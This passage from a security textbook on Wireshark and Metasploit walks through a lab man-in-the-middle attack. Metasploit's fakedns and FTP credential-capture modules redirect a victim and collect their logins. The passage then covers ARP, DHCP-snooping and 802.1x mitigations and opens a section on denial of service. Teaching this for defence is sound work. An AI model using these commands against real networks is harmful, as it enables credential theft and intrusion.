style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Soon after starting the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fakedns</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >exploit module, your Metasploit screen will be echoing every DNS query it encounters. Queries that aren&#8217;t within the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETDOMAIN</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >setting will be bypassed. But queries to the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section211" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >FTP1.labs will be resolved using our Kali machine&#8217;s IP address. You</span><span><a href="#_bookmark416" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;can see both the bypassed and resolved queries occurring in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >14</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="155"  height="0" ></td></tr><tr><td></td><td><img width="712"  height="478"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker270794.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark416" ></a><span><a href="#_bookmark415" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-14:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >DNS queries</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:9.9500pt;margin-right:10.9000pt;text-align:justify;text-justify:inter-ideograph;" ><a name="_bookmark417" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So, as you can see, the screen can get busy and fast. And this isn&#8217;t even an especially busy network. It might serve you better to run the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >exploit job in quiet</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >mode.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here is how to rerun the exploit in a quieter fashion:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l9 level1 lfo15;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Press Ctrl+C to interrupt the screen</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >output.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l9 level1 lfo15;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >List the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msfconsole</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >jobs. Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >jobs -l </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(note the lowercase </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >l</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.4000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l9 level1 lfo15;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Kill</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fakedns</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >job.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Type</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >jobs</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >-k</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >1</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(number</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fakedns</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >job</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >id).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.4000pt;margin-right:83.6000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:2.2500pt;text-align:left;line-height:145%;mso-list:l9 level1 lfo15;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Restart the exploit module quietly by typing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exploit</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >-q</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. You should have a screen similar to that in<a name="_bookmark418" ></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark419" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.1000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >5-15</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section212" ><p class=MsoBodyText  style="margin-left:29.0000pt;" ><img width="710"  height="525"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker271398.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark419" ></a><span><a href="#_bookmark418" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-15:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Quieter fake DNS</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You&#8217;ve verified the setup is working. Now check it out in Wireshark and you will see that three things are occurring:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:178.7000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker271581.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:64.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker271582.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You have responded to DHCP requests. You are getting DNS traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker271649.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For DNS queries to the ftp1.labs host, your IP address is delivered.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Setting Up a Fake FTP Server</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You now know that FTP queries are getting resolved to your system. But what would users find there? They are knocking on the door, but no one is home!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s <a name="_bookmark420" ></a>set up a fake FTP server to capture credentials from our victim. We don&#8217;t even need to configure this module, as the default options work immediately.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l14 level1 lfo16;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >use auxiliary/server/capture/ftp </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >console.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section213" ><p class=17  style="margin-top:3.7500pt;margin-right:21.4000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l14 level1 lfo16;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span><a href="#_bookmark422" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Show options as well, and you should see what is shown in</span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.6500pt;font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-16</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="155"  height="0" ></td></tr><tr><td></td><td><img width="710"  height="558"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker272218.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark422" ></a><span><a href="#_bookmark421" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-16:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >FTP capturing</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:9.9500pt;margin-right:15.3000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Within seconds, you should see captured FTP credentials. (I had to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >be rather quick to capture the screenshot without them.) We will leave it to the end of chapter exercises for you to discover the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >credentials.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >How to Prevent MitM Attacks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As mentioned earlier, this chapter just scratches the surface of the protocols that can be leveraged for MitM attacks. It may seem like open season for network hacking, but there are various mitigations that can be deployed to prevent some of the techniques described in this chapter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><a name="_bookmark423" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For ARP poisoning, one solution is to set static ARP tables. This effectively means an administrator hardcodes the association between</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section214" ><p class=MsoBodyText  style="margin-top:4.0000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >MAC addresses and IP address. The issue with this solution is that it does not scale well. If you manage an enterprise consisting of thousands of machines, it is unreasonable to manually configure the ARP table for every machine. There are products on the market that perform ARP inspection. These products attempt to keep track of normal ARP traffic and will flag anonymous ARP packets, a bit like how Wireshark warns us that two different MAC addresses were tied to the same IP address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Another mitigation technique is DHCP snooping. DHCP snooping specifies a trusted DHCP server. The switch then listens to every DHCP response from this trusted DHCP server and builds a binding table of IP address-to-switch port. With this knowledge, the switch is able to tell which host is on which port, and if it sees, for example, a host sending out ARP replies for an IP that it does not possess, the switch will prevent that traffic. DHCP snooping also prevents malicious DHCP servers, as it will drop all DHCP responses that don&#8217;t originate from the trusted DHCP server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:10.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One final technology to discuss is 802.1x. This protocol is a standard for port-based Network Access Control (NAC), which can be leveraged to keep bad guys off the network in the first place to stop potential MitM attacks at the source. Basically, a switch will attempt to authenticate every host that connects to the network. If a host is unauthorized, the switch will not forward traffic. This effectively stops all attacks, as malicious hosts shouldn&#8217;t be able to get access to the network. Note we said &#8220;shouldn&#8217;t.&#8221; While there are all kinds of fancy 802.1x authentication mechanisms, ultimately the only uniquely identifying attribute at layer 2 is the MAC address. Remember our discussion in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >about Linux bridges? It turns out that you can leverage these to perform a MitM attack against clients connected to an 802.1x-protected network. It relies on having physical access to the victim machine and placing your attacker machine directly between the victim and the switch port. The goal is to piggyback off the authenticated victim client to give yourself unauthorized access to an 802.1x-protected network. Check out the Note on DEFCON for a link regarding this attack.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section215" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:338.0000px;" ><img width="763"  height="338"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker275249.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><a name="_bookmark424" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Attack Type: Denial of Service" ></a>Attack Type: Denial of Service</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The denial-of-service (DoS) attack has one purpose: stop service. Compared to other attack forms, a DoS tends to be the most simple- minded, noisiest, and crudest way to attack. Performing a DoS does </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >not </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >require finesse. It can require <a name="_bookmark425" ></a>gathering significant resources to launch, because the attack is purely a brute force show of strength.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.6500pt;margin-right:15.6000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The DoS attack is a screamer. While stopping service is the main</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >goal, getting as much as attention as possible is a close second. That&#8217;s a big differentiator from other attack</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >types.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A DoS is usually performed at arm&#8217;s length through some go-between system&#8212;typically a botnet of compromised systems&#8212;or at least performed in a way to not lead back to the actual attacker. To sum up, we&#8217;re not sugar-coating it here to say the DoS attack is a cowardly form of bullying (as most bullying is).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the security triad of Confidentiality, Integrity, and Availability, the DoS is an attack on availability, plain and simple. DoS attacks are the attackers&#8217; choice when they wish to stop or interrupt service and do so in the most attention-grabbing way they can. So, if so cowardly and crude, why do they work?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Why DoS Attacks Are Effective</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
